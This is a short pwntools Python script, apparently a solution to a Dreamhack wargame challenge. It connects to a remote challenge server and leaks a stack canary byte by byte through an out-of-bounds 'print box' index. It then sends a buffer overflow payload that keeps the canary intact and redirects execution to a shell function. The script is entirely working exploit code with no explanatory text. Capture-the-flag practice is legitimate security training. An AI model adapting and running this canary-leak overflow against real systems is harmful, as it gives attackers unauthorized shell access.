
from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 14756
r = remote(HOST, PORT)

sh = 0x80486b9

def print_box(idx):
    r.sendlineafter(b'> ', b'P')
    r.sendlineafter(b': ', str(idx).encode())

def exit(len, data):
    r.sendlineafter(b'> ', b'E')
    r.sendlineafter(b': ', f'{len}'.encode())
    r.sendlineafter(b': ', data)

canary = []

for i in range(129, 129+3):
    print_box(i)
    r.recvuntil(b'is : ')
    canary.append(r.recvline().strip().decode())

canary = int('0x' + ''.join(canary[::-1]) + '00', 16)
payload = b'A' * 64 + p32(canary) + b'A' * 8 + p32(sh)
exit(len(payload) + 1, payload)

r.interactive()